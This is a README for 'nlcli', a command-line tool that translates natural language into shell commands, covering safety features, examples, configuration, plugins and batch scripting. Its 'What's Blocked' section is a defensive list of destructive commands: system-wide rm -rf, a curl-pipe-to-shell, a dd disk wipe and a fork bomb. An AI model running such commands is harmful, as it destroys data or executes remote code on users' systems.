# Natural Language Driven CLI

A cross-platform command-line companion that turns natural language ("show files >1GB modified this week") into safe, auditable system commands, with dry-runs, confirmations, and a plugin ecosystem.

## 🚀 Quick Start

### Installation

```bash
# Install with pip (recommended)
pip install nlcli

# Or install for development
git clone https://github.com/ambicuity/Natural-Language-Driven-CLI.git
cd Natural-Language-Driven-CLI
pip install -e .
```

### First Steps

```bash
# Start the interactive CLI
nlcli

# Execute batch script
nlcli --batch script.nlcli

# Execute multiple commands in batch mode
nlcli --batch-commands "find large files" --batch-commands "list directories"

# Set language preference
nlcli --lang es

# Try some natural language commands
› show files >1GB modified this week
› find all .py files containing TODO  
› list processes using port 3000

# Multi-language examples
› mostrar archivos grandes (Spanish)
› lister tous les fichiers (French)
› alle dateien anzeigen (German)
```

## 🌟 Features

### 🛡️ Safety First
- **Dry-run by default** - See what commands will do before execution
- **Smart confirmations** - Required for destructive operations
- **Sandboxed execution** - Commands run with timeouts and resource limits
- **Undo hints** - Get suggestions for reversing operations

### 🧠 Natural Language Understanding
- **Intent recognition** - Converts natural language to structured commands
- **Context awareness** - Remembers your session state and preferences
- **Pronoun resolution** - "Delete those files" knows what "those" refers to
- **Multi-step operations** - Chain commands together intelligently

### 🔧 Built-in Tools
- **File operations**: find, list, search content, disk usage, file info
- **Process management**: list processes, kill by port/name, process tree, system resources
- **Network tools**: ping, curl, network connections, DNS lookup, download files
- **Package info**: brew/apt package details, search, list installed packages
- **Git operations**: read-only git commands (status, log, diff, branches, etc.)
- **LLM integration**: optional local language model for enhanced understanding
- **Plugin system**: extensible architecture with custom tool plugins
- **Multi-language support**: natural language input in multiple languages
- **Cloud LLM fallback**: automatic fallback to cloud providers (OpenAI, Anthropic, Google)
- **Advanced context**: semantic understanding with conversation memory
- **Batch mode**: execute multiple commands from scripts or command line

### 🚀 Production Ready Features (Phase 4)
- **Enhanced security audit**: comprehensive vulnerability scanning and threat detection
- **Performance monitoring**: real-time profiling, resource usage tracking, and optimization
- **Advanced error recovery**: intelligent error handling with retry mechanisms and graceful degradation
- **Comprehensive telemetry**: metrics collection, usage analytics, and observability
- **Enterprise features**: role-based access control, audit logging, policy enforcement, and configuration management
- **Command sanitization**: automatic removal of dangerous command patterns
- **Security policies**: customizable security rules and violation detection
- **Performance caching**: intelligent caching layer for improved response times
- **Resource monitoring**: real-time system resource usage tracking

## 📖 Examples

### File Operations

```bash
› show files >1GB modified this week
💡 I'll search for files in the current directory larger than 1GB modified this week.
📝 Command: find . -type f -size +1G -mtime -7 -print0 | xargs -0 ls -lh
✅ Run? [y/N] y

› find .py files containing TODO in src
💡 I'll search for text content in *.py files containing 'TODO' in src.
📝 Command: grep -rn 'TODO' --include='*.py' src

› what's taking up space in Downloads
💡 I'll show disk usage information in ~/Downloads.
📝 Command: du -h --max-depth=1 ~/Downloads | sort -hr
```

### Interactive Session

```bash
› find large files in Downloads  
💡 I'll search for files in ~/Downloads larger than 100MB.
📝 Command: find ~/Downloads -type f -size +100M -print0 | xargs -0 ls -lh

› now only show videos
💡 I'll search for files in ~/Downloads larger than 100MB matching pattern '*.mp4,*.mkv,*.avi'.
📝 Command: find ~/Downloads -type f -size +100M \( -name "*.mp4" -o -name "*.mkv" -o -name "*.avi" \)

› delete those files
⚠️  This will modify your system. Continue? [y/N]
```

```

## 🔒 Safety & Security

### Built-in Protections

- ✅ Whitelist approach - only known-safe commands allowed
- ✅ Path restrictions - operations limited to allowed directories
- ✅ Pattern blocking - dangerous patterns (rm -rf /, etc.) blocked
- ✅ Confirmation prompts - destructive operations require confirmation
- ✅ Resource limits - commands have timeouts and output size limits
- ✅ Audit logging - all operations logged for review

### What's Blocked

```bash
❌ rm -rf /                    # System-wide deletion
❌ chmod -R 777 *              # Dangerous permissions  
❌ curl malicious.site | sh    # Remote code execution
❌ dd if=/dev/zero of=/dev/sda # Disk wiping
❌ :(){ :|:& }                 # Fork bombs
```

### Confirmation Required

```bash
⚠️  rm large-file.zip          # File deletion
⚠️  find . -name "*.tmp" -delete # Bulk deletion
⚠️  mv important/ /tmp/        # Moving important directories
```

## ⚙️ Configuration

Configuration file: `~/.nlcli/config.json`

```json
{
  "preferences": {
    "default_editor": "nano",
    "confirm_by_default": true,
    "allowed_directories": ["/Users/username", "/tmp"],
    "model_preference": "local",
    "language": "en",
    "max_results": 50,
    "trash_instead_of_delete": true
  },
  "safety": {
    "timeout_seconds": 30,
    "max_output_size": "1MB"
  }
}
```

## 🧪 Development

### Setup Development Environment

```bash
git clone https://github.com/ambicuity/Natural-Language-Driven-CLI.git
cd Natural-Language-Driven-CLI
pip install -e ".[dev]"
```

### Running Tests

```bash
pytest tests/
```

### Code Quality

```bash
# Format code
black src/ tests/

# Sort imports  
isort src/ tests/

# Lint
flake8 src/ tests/

# Type checking
mypy src/
```

## 🔌 Plugin Development

Create custom tools for domain-specific commands:

```python
from nlcli.registry import ToolSchema, ToolArg

def get_my_tools():
    return [
        ToolSchema(
            name="docker_ps",
            summary="List Docker containers",
            args={
                "all": ToolArg("all", "boolean", default=False)
            },
            generator={
                "cmd": "docker ps {all_flag}",
                "clauses": {"all_flag": "-a"}
            },
            danger_level="read_only",
            examples=[
                {"nl": "show docker containers", "args": {"all": False}},
                {"nl": "list all containers including stopped", "args": {"all": True}}
            ],
            keywords=["docker", "containers", "ps"]
        )
    ]

def get_plugin_info():
    return {
        "name": "docker",
        "version": "1.0.0",
        "description": "Docker container management tools",
        "author": "Your Name"
    }
```

Save as `~/.nlcli/plugins/docker_plugin.py` and it will be automatically loaded.

## 🌐 Multi-language Support

NLCLI supports natural language input in multiple languages:

- **English**: "find large files"
- **Spanish**: "buscar archivos grandes"  
- **French**: "chercher gros fichiers"
- **German**: "große dateien finden"
- **Portuguese**: "encontrar arquivos grandes"
- **Italian**: "trova file grandi"

Language detection is automatic, or set your preference:
```bash
export NLCLI_DEFAULT_LANG=es
nlcli --lang fr
```

## ☁️ Cloud LLM Integration

Enable cloud LLM providers for enhanced understanding:

```bash
# OpenAI
export OPENAI_API_KEY=your_key
export NLCLI_CLOUD_LLM_ENABLED=true

# Anthropic  
export ANTHROPIC_API_KEY=your_key

# Google
export GOOGLE_API_KEY=your_key
```

The system automatically falls back to cloud providers when local LLM is unavailable.

## 📝 Batch Mode & Scripting

Execute multiple commands from scripts:

```bash
# Create a batch script (script.nlcli)
@name File Cleanup Script
@description Clean up large and old files

BASE_DIR=/tmp
LOG_FILE=/tmp/cleanup.log

> find files larger than 100MB in ${BASE_DIR}
timeout: 30
> delete old files older than 30 days
depends: 1
condition: success
retry: 2
```

Execute the script:
```bash
nlcli --batch script.nlcli
```

Or run commands directly:
```bash
nlcli --batch-commands "find large files" --batch-commands "show disk usage"
```
